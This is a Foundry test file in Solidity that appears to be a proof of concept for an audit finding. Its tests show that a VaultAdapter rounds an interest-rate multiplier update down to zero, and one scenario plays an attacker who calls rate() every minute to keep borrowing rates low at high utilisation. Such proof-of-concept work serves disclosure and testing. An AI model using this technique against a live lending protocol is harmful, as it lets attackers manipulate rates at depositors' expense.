// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {VaultAdapter} from "../../src/oracle/libraries/VaultAdapter.sol";
import {IVault} from "../../src/interfaces/IVault.sol";
import {IVaultAdapter} from "../../src/interfaces/IVaultAdapter.sol";
import {Access} from "../../src/access/Access.sol";
import {VaultAdapterStorageUtils} from "../../src/storage/VaultAdapterStorageUtils.sol";

// Mock Vault contract for testing
contract MockVault is IVault {
    mapping(address => uint256) public utilizationMap;
    mapping(address => uint256) public utilizationIndexMap;
    
    function utilization(address asset) external view override returns (uint256) {
        return utilizationMap[asset];
    }
    
    function currentUtilizationIndex(address asset) external view override returns (uint256) {
        return utilizationIndexMap[asset];
    }
    
    function setUtilization(address asset, uint256 _utilization) external {
        utilizationMap[asset] = _utilization;
    }
    
    function setUtilizationIndex(address asset, uint256 _index) external {
        utilizationIndexMap[asset] = _index;
    }
}

// Mock Access Control contract
contract MockAccessControl {
    mapping(address => mapping(bytes4 => bool)) public permissions;
    
    function setPermission(address caller, bytes4 selector, bool _hasPermission) external {
        permissions[caller][selector] = _hasPermission;
    }
    
    function hasPermission(address caller, bytes4 selector) external view returns (bool) {
        return permissions[caller][selector];
    }
}

contract VaultAdapterExploitTest is Test {
    VaultAdapter public vaultAdapter;
    MockVault public mockVault;
    MockAccessControl public accessControl;
    
    address public constant ASSET = address(0x1);
    address public constant VAULT = address(0x2);
    address public constant OWNER = address(0x3);
    address public constant ATTACKER = address(0x4);
    
    // Test parameters
    uint256 public constant KINK = 8e26; // 80% utilization kink
    uint256 public constant RATE = 1e23; // Small rate to make rounding issue more apparent
    uint256 public constant MAX_MULTIPLIER = 2e27;
    uint256 public constant MIN_MULTIPLIER = 5e26;
    uint256 public constant BASE_RATE = 1e25; // 0.01 base rate
    
    function setUp() public {
        // Deploy mock contracts
        mockVault = new MockVault();
        accessControl = new MockAccessControl();
        
        // Deploy VaultAdapter
        vaultAdapter = new VaultAdapter();
        
        // Initialize VaultAdapter
        vm.prank(OWNER);
        vaultAdapter.initialize(address(accessControl));
        
        // Set up permissions for OWNER
        accessControl.setPermission(OWNER, vaultAdapter.setSlopes.selector, true);
        accessControl.setPermission(OWNER, vaultAdapter.setLimits.selector, true);
        
        // Set initial vault parameters
        vm.prank(OWNER);
        vaultAdapter.setLimits(MAX_MULTIPLIER, MIN_MULTIPLIER, RATE);
        
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            kink: KINK,
            slope0: BASE_RATE,
            slope1: BASE_RATE * 2 // Double rate after kink
        });
        
        vm.prank(OWNER);
        vaultAdapter.setSlopes(ASSET, slopes);
        
        // Set initial utilization in mock vault (above kink to test multiplier increase)
        mockVault.setUtilization(ASSET, 9e26); // 90% utilization
        mockVault.setUtilizationIndex(ASSET, 1e27);
    }
    
    function test_MultiplierRoundingVulnerability() public {
        // First call to initialize the utilization data
        uint256 initialRate = vaultAdapter.rate(VAULT, ASSET);
        console.log("Initial rate:", initialRate);
        
        // Fast forward time but not enough for multiplier to change significantly
        // We want _elapsed * RATE < 1e27 to trigger the rounding issue
        uint256 smallTimeJump = (1e27 / RATE) - 1; // Just under the threshold
        vm.warp(block.timestamp + smallTimeJump);
        
        // Update utilization index to simulate vault activity
        mockVault.setUtilizationIndex(ASSET, 2e27);
        
        // Call rate frequently to prevent multiplier from changing
        uint256 rateBeforeFrequentCalls = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate before frequent calls:", rateBeforeFrequentCalls);
        
        // Make multiple calls within the time window
        for (uint256 i = 0; i < 10; i++) {
            // Small time jump that keeps _elapsed * RATE < 1e27
            vm.warp(block.timestamp + 100); // 100 seconds
            mockVault.setUtilizationIndex(ASSET, 2e27 + i * 1e25);
            uint256 currentRate = vaultAdapter.rate(VAULT, ASSET);
            console.log("Rate during frequent calls", i, ":", currentRate);
        }
        
        // The rate should not have changed significantly due to the rounding issue
        uint256 rateAfterFrequentCalls = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate after frequent calls:", rateAfterFrequentCalls);
        
        // Verify that the rate hasn't changed much (demonstrating the vulnerability)
        assertApproxEqRel(rateBeforeFrequentCalls, rateAfterFrequentCalls, 0.01e18, "Rate should remain stable due to rounding");
        
        // Now let's see what happens with a proper time jump
        vm.warp(block.timestamp + (1e27 / RATE) + 1); // Enough time for multiplier to change
        
        mockVault.setUtilizationIndex(ASSET, 3e27);
        uint256 rateAfterProperTime = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate after proper time jump:", rateAfterProperTime);
        
        // The rate should now change significantly
        assertTrue(rateAfterProperTime > rateAfterFrequentCalls * 1.1e27 / 1e27, "Rate should increase with proper time elapsed");
    }
    
    function test_MultiplierDecreaseRoundingVulnerability() public {
        // Test the vulnerability when utilization is below kink (multiplier should decrease)
        mockVault.setUtilization(ASSET, 5e26); // 50% utilization (below kink)
        
        // First call to initialize
        uint256 initialRate = vaultAdapter.rate(VAULT, ASSET);
        console.log("Initial rate (low utilization):", initialRate);
        
        // Fast forward with small time jumps
        uint256 smallTimeJump = (1e27 / RATE) - 1;
        vm.warp(block.timestamp + smallTimeJump);
        
        mockVault.setUtilizationIndex(ASSET, 1.5e27);
        
        uint256 rateBeforeFrequentCalls = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate before frequent calls (low utilization):", rateBeforeFrequentCalls);
        
        // Make frequent calls
        for (uint256 i = 0; i < 10; i++) {
            vm.warp(block.timestamp + 100);
            mockVault.setUtilizationIndex(ASSET, 1.5e27 + i * 1e24);
            uint256 currentRate = vaultAdapter.rate(VAULT, ASSET);
            console.log("Rate during frequent calls", i, ":", currentRate);
        }
        
        uint256 rateAfterFrequentCalls = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate after frequent calls (low utilization):", rateAfterFrequentCalls);
        
        // Rate should not have decreased significantly
        assertApproxEqRel(rateBeforeFrequentCalls, rateAfterFrequentCalls, 0.01e18, "Rate should remain stable due to rounding");
        
        // Now with proper time jump
        vm.warp(block.timestamp + (1e27 / RATE) + 1);
        mockVault.setUtilizationIndex(ASSET, 2e27);
        
        uint256 rateAfterProperTime = vaultAdapter.rate(VAULT, ASSET);
        console.log("Rate after proper time jump (low utilization):", rateAfterProperTime);
        
        // Rate should now decrease
        assertTrue(rateAfterProperTime < rateAfterFrequentCalls * 0.9e27 / 1e27, "Rate should decrease with proper time elapsed");
    }
    
    function test_ExploitScenario() public {
        // Simulate an attacker exploiting the vulnerability
        console.log("=== EXPLOIT SCENARIO ===");
        
        // Attacker wants to keep rates low during high utilization
        mockVault.setUtilization(ASSET, 95e25); // 95% utilization (very high)
        
        // Normal scenario: rate should increase over time
        uint256 normalRate = vaultAdapter.rate(VAULT, ASSET);
        console.log("Normal initial rate:", normalRate);
        
        // Attacker starts calling frequently to prevent rate increase
        vm.startPrank(ATTACKER);
        
        for (uint256 i = 0; i < 50; i++) {
            vm.warp(block.timestamp + 60); // 1 minute intervals
            mockVault.setUtilizationIndex(ASSET, 1e27 + i * 1e25);
            uint256 exploitedRate = vaultAdapter.rate(VAULT, ASSET);
            
            if (i % 10 == 0) {
                console.log("Exploited rate at call", i, ":", exploitedRate);
            }
        }
        
        vm.stopPrank();
        
        uint256 finalExploitedRate = vaultAdapter.rate(VAULT, ASSET);
        console.log("Final exploited rate:", finalExploitedRate);
        
        // Now see what the rate should be without exploitation
        vm.warp(block.timestamp + (1e27 / RATE) + 1);
        mockVault.setUtilizationIndex(ASSET, 5e27);
        
        uint256 normalFinalRate = vaultAdapter.rate(VAULT, ASSET);
        console.log("Normal final rate (without exploitation):", normalFinalRate);
        
        // The exploited rate should be significantly lower than the normal rate
        assertTrue(finalExploitedRate < normalFinalRate * 0.5e27 / 1e27, "Exploited rate should be much lower than normal rate");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker prevented rate increase by", 
            ((normalFinalRate - finalExploitedRate) * 100 / normalFinalRate), "%");
    }
    
    function test_DemonstrateRoundingCalculation() public {
        // Direct demonstration of the rounding issue
        console.log("=== ROUNDING CALCULATION DEMONSTRATION ===");
        
        uint256 elapsed = 100; // Small elapsed time
        uint256 rate = 1e23; // Small rate
        
        // This is the problematic calculation from the contract
        uint256 roundingResult = (elapsed * rate / 1e27);
        console.log("elapsed * rate / 1e27 with elapsed=100, rate=1e23:", roundingResult);
        console.log("Expected: 0 (due to rounding down)");
        
        // Verify it's 0
        assertEq(roundingResult, 0, "Should round down to 0");
        
        // Now with larger elapsed time
        uint256 largeElapsed = 1e27 / rate + 1; // Just enough to avoid rounding
        uint256 largeResult = (largeElapsed * rate / 1e27);
        console.log("elapsed * rate / 1e27 with elapsed=", largeElapsed, ", rate=1e23:", largeResult);
        console.log("Expected: 1 (no rounding)");
        
        // Verify it's 1
        assertEq(largeResult, 1, "Should not round down to 0");
        
        console.log("=== ROUNDING ISSUE CONFIRMED ===");
    }
}